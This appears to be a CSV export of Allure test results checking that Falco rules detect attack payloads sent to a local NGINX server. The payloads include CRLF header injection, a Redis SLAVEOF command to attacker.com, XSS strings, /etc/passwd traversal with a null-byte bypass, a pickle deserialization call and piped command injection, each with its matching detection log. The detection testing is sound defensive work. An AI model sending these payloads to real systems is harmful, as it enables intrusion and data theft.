"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CRLF_HDR_004` |
| **Name** | CORS Header Injection via Uppercase CRLF |
| **Category** | CRLF |
| **Subcategory** | header_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `\r\nAccess-Control-Allow-Origin:*`
- **Encoded**: `%0D%0AAccess-Control-Allow-Origin%3A*`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~38000ms
- **Timestamp**: 11:11:21.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CRLF] CRLF Injection attempt detected` |
| **Matched Rule** | `[NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_HDR_004-1772277081413-rdcuff pattern_id=CRLF_HDR_004 uri=/?q=%0D%0AAccess-Control-Allow-Origin%3A* client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_HDR_004-1772277081413-rdcuff pattern_id=CRLF_HDR_004 uri=/?q=%0D%0AAccess-Control-Allow-Origin%3A* client=127.0.0.1

**Falco Log Entry**:
```
11:11:21.000000000: Warning [NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_HDR_004-1772277081413-rdcuff pattern_id=CRLF_HDR_004 uri=/?q=%0D%0AAccess-Control-Allow-Origin%3A* client=127.0.0.1
```","2","test_e2e_with_logs[624_CRLF_HDR_004]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `NOSQL_REDIS_003` |
| **Name** | Redis SLAVEOF Command Injection |
| **Category** | NOSQL_EXTENDED |
| **Subcategory** | redis |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `SLAVEOF attacker.com 6379`
- **Encoded**: `SLAVEOF%20attacker.com%206379`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~61000ms
- **Timestamp**: 11:10:58.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] Redis command injection` |
| **Matched Rule** | `[NGINX Emerging Threat] Redis command injection test_id=NOSQL_REDIS_003-1772277058430-2q77i5 pattern_id=NOSQL_REDIS_003 uri=/?q=SLAVEOF%20attacker.com%206379 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Redis command injection test_id=NOSQL_REDIS_003-1772277058430-2q77i5 pattern_id=NOSQL_REDIS_003 uri=/?q=SLAVEOF%20attacker.com%206379 client=127.0.0.1

**Falco Log Entry**:
```
11:10:58.000000000: Critical [NGINX Emerging Threat] Redis command injection test_id=NOSQL_REDIS_003-1772277058430-2q77i5 pattern_id=NOSQL_REDIS_003 uri=/?q=SLAVEOF%20attacker.com%206379 client=127.0.0.1
```","2","test_e2e_with_logs[777_NOSQL_REDIS_003]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_BYPASS_008` |
| **Name** | Object data URL injection |
| **Category** | XSS |
| **Subcategory** | bypass |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<object data='data:text/html,<script>alert(1)</script>'>`
- **Encoded**: `%3Cobject%20data%3D'data%3Atext%2Fhtml%2C%3Cscript%3Ealert(1)%3C%2Fscript%3E'%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~94000ms
- **Timestamp**: 11:10:25.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_BYPASS_008-1772277025956-yhnoiy pattern_id=XSS_BYPASS_008 uri=/?q=%3Cobject%20data%3D'data%3Atext%2Fhtml%2C%3Cscript%3Ealert(1)%3C%2Fscript%3E'%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_BYPASS_008-1772277025956-yhnoiy pattern_id=XSS_BYPASS_008 uri=/?q=%3Cobject%20data%3D'data%3Atext%2Fhtml%2C%3Cscript%3Ealert(1)%3C%2Fscript%3E'%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
11:10:25.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_BYPASS_008-1772277025956-yhnoiy pattern_id=XSS_BYPASS_008 uri=/?q=%3Cobject%20data%3D'data%3Atext%2Fhtml%2C%3Cscript%3Ealert(1)%3C%2Fscript%3E'%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[155_XSS_BYPASS_008]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `HHI_XH_001` |
| **Name** | X-Host injection |
| **Category** | HOST_HEADER |
| **Subcategory** | host_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `X-Host: evil.com`
- **Encoded**: `X-Host%3A%20evil.com`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~34000ms
- **Timestamp**: 11:11:25.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Host Header] Host header injection attempt detected` |
| **Matched Rule** | `[NGINX Host Header] Host header injection attempt detected test_id=HHI_XH_001-1772277085912-dt7j4 pattern_id=HHI_XH_001 uri=/?q=X-Host%3A%20evil.com client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Host Header] Host header injection attempt detected test_id=HHI_XH_001-1772277085912-dt7j4 pattern_id=HHI_XH_001 uri=/?q=X-Host%3A%20evil.com client=127.0.0.1

**Falco Log Entry**:
```
11:11:25.000000000: Warning [NGINX Host Header] Host header injection attempt detected test_id=HHI_XH_001-1772277085912-dt7j4 pattern_id=HHI_XH_001 uri=/?q=X-Host%3A%20evil.com client=127.0.0.1
```","2","test_e2e_with_logs[846_HHI_XH_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_MUT_007` |
| **Name** | Marquee tag XSS |
| **Category** | XSS |
| **Subcategory** | mutation |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<marquee onstart=alert('XSS')>`
- **Encoded**: `%3Cmarquee%20onstart%3Dalert('XSS')%3E`
- **Expected Detection**: No

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 0 / 1
- **Latency**: N/A
- **Timestamp**: N/A

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `` |
| **Matched Rule** | `None` |
| **Rule Match** | ✅ Expected Not Detected |

## Detection Evidence



**Falco Log Entry**:
```

```","1","test_e2e_with_logs[189_XSS_MUT_007]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PICKLE_DESER_002` |
| **Name** | pickle.loads Remote Code Execution |
| **Category** | PICKLE |
| **Subcategory** | deserialization |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `pickle.loads(base64.b64decode(data))`
- **Encoded**: `pickle.loads%28base64.b64decode%28data%29%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~59000ms
- **Timestamp**: 11:11:00.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] Deserialization attack` |
| **Matched Rule** | `[NGINX Emerging Threat] Deserialization attack test_id=PICKLE_DESER_002-1772277060409-gpb4o8 pattern_id=PICKLE_DESER_002 uri=/?q=pickle.loads%28base64.b64decode%28data%29%29 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Deserialization attack test_id=PICKLE_DESER_002-1772277060409-gpb4o8 pattern_id=PICKLE_DESER_002 uri=/?q=pickle.loads%28base64.b64decode%28data%29%29 client=127.0.0.1

**Falco Log Entry**:
```
11:11:00.000000000: Critical [NGINX Emerging Threat] Deserialization attack test_id=PICKLE_DESER_002-1772277060409-gpb4o8 pattern_id=PICKLE_DESER_002 uri=/?q=pickle.loads%28base64.b64decode%28data%29%29 client=127.0.0.1
```","2","test_e2e_with_logs[531_PICKLE_DESER_002]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `ENC_SQLI_DBL_001` |
| **Name** | Double-encoded UNION SELECT |
| **Category** | SQLI |
| **Subcategory** | double_encoded |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `UNION SELECT`
- **Encoded**: `%2555NION%2553ELECT`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~52000ms
- **Timestamp**: 11:11:07.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern` |
| **Matched Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern test_id=ENC_SQLI_DBL_001-1772277067062-wa6m98 pattern_id=ENC_SQLI_DBL_001 uri=/?q=%2555NION%2553ELECT client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Encoded SQL Injection Pattern test_id=ENC_SQLI_DBL_001-1772277067062-wa6m98 pattern_id=ENC_SQLI_DBL_001 uri=/?q=%2555NION%2553ELECT client=127.0.0.1 method=GET

**Falco Log Entry**:
```
11:11:07.000000000: Warning [NGINX SQLi] Encoded SQL Injection Pattern test_id=ENC_SQLI_DBL_001-1772277067062-wa6m98 pattern_id=ENC_SQLI_DBL_001 uri=/?q=%2555NION%2553ELECT client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[803_ENC_SQLI_DBL_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ABS_001` |
| **Name** | Direct absolute path to passwd file |
| **Category** | PATH |
| **Subcategory** | absolute_paths |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `/etc/passwd`
- **Encoded**: `/etc/passwd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~102000ms
- **Timestamp**: 11:10:17.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] File inclusion attack detected` |
| **Matched Rule** | `[NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_001-1772277017427-cow92l pattern_id=PATH_ABS_001 uri=/?q=/etc/passwd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_001-1772277017427-cow92l pattern_id=PATH_ABS_001 uri=/?q=/etc/passwd client=127.0.0.1

**Falco Log Entry**:
```
11:10:17.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_001-1772277017427-cow92l pattern_id=PATH_ABS_001 uri=/?q=/etc/passwd client=127.0.0.1
```","2","test_e2e_with_logs[229_PATH_ABS_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ADV_053` |
| **Name** | Null Byte Variant |
| **Category** | PATH |
| **Subcategory** | filter_bypass |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `../etc/passwd%00.jpg`
- **Encoded**: `..%2Fetc%2Fpasswd%2500.jpg`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~84000ms
- **Timestamp**: 11:10:35.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_ADV_053-1772277035967-a3w8j9 pattern_id=PATH_ADV_053 uri=/?q=..%2Fetc%2Fpasswd%2500.jpg client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_ADV_053-1772277035967-a3w8j9 pattern_id=PATH_ADV_053 uri=/?q=..%2Fetc%2Fpasswd%2500.jpg client=127.0.0.1

**Falco Log Entry**:
```
11:10:35.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_ADV_053-1772277035967-a3w8j9 pattern_id=PATH_ADV_053 uri=/?q=..%2Fetc%2Fpasswd%2500.jpg client=127.0.0.1
```","2","test_e2e_with_logs[246_PATH_ADV_053]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_PIPE_004` |
| **Name** | Directory listing piped to head |
| **Category** | CMDI |
| **Subcategory** | pipe |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `ls -la | head -10`
- **Encoded**: `ls%20-la%20%7C%20head%20-10`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~66000ms
- **Timestamp**: 11:10:53.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via pipe` |
| **Matched Rule** | `[NGINX CMDi] Command injection via pipe test_id=CMD_PIPE_004-1772277053497-j9nl68 pattern_id=CMD_PIPE_004 uri=/?q=ls%20-la%20%7C%20head%20-10 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via pipe test_id=CMD_PIPE_004-1772277053497-j9nl68 pattern_id=CMD_PIPE_004 uri=/?q=ls%20-la%20%7C%20head%20-10 client=127.0.0.1

**Falco Log Entry**:
```
11:10:53.000000000: Critical [NGINX CMDi] Command injection via pipe test_id=CMD_PIPE_004-1772277053497-j9nl68 pattern_id=CMD_PIPE_004 uri=/?q=ls%20-la%20%7C%20head%20-10 client=127.0.0.1
```","2","test_e2e_with_logs[382_CMD_PIPE_004]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
